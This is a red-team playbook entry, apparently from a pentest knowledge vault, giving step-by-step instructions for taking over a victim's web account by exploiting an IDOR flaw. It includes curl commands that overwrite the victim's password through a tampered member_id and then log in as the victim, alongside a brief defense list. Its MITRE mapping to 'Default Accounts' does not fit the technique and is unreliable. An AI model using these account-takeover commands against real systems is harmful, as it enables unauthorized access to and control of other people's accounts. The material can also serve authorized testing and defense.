---
id: uuid-3
tags:
  - idor
  - account-takeover
  - persistence
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-submit-takeover-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-05T12:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:24.285Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Default Accounts]]'
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Submit-Tampered-Request-for-Account-Takeover

## Summary

This procedure executes a tampered POST request to modify a victim's account, achieving full takeover such as credential changes or data exfiltration via IDOR exploitation.

## Description

With the member_id manipulated, submit requests that perform destructive or controlling actions on the victim's account. This targets authorization flaws in web apps, leading to complete compromise. The scenario assumes prior parameter tampering success, with outcomes including persistent access to the victim's resources.

## Requirements

1. Confirmed IDOR via manipulated member_id access
2. Knowledge of account update endpoints or parameters (e.g., password change)
3. Stable authenticated session

## Defense

Defensive measures and detection strategies:

- Require multi-factor authentication for sensitive changes
- Audit logs for cross-user actions and implement IP/session binding
- Use CAPTCHA or secondary verification for account modifications

## Objectives

1. Perform unauthorized modifications on victim account
2. Gain persistent control (e.g., new credentials)
3. Verify takeover through follow-on access

## Instructions

### Step 1: Craft Takeover Request

**Context**: Build a POST request with the tampered member_id and action parameters to alter account details, such as updating the password.

**Command** ([[commands/curl-submit-takeover-request]]):
```bash
curl -X POST 'https://target.com/█████████' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"member_id": "VICTIM_ID", "new_password": "ATTACKER_PASSWORD"}'
```

> Expected output: Success response (e.g., {"updated": true}), indicating the change applied to the victim's account.

### Step 2: Verify Account Control

**Context**: Test the takeover by attempting to access or login to the modified account using new credentials.

**Command** ([[commands/curl-submit-takeover-request]]):
```bash
curl -X POST 'https://target.com/login' \
  -H 'Content-Type: application/json' \
  -d '{"username": "VICTIM_USERNAME", "password": "ATTACKER_PASSWORD"}'
```

> Success: Valid token or session returned, confirming control.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques

- [[Default Accounts]]

## Commands Used

- [[commands/curl-submit-takeover-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[account-takeover]]
- [[Persistence]]
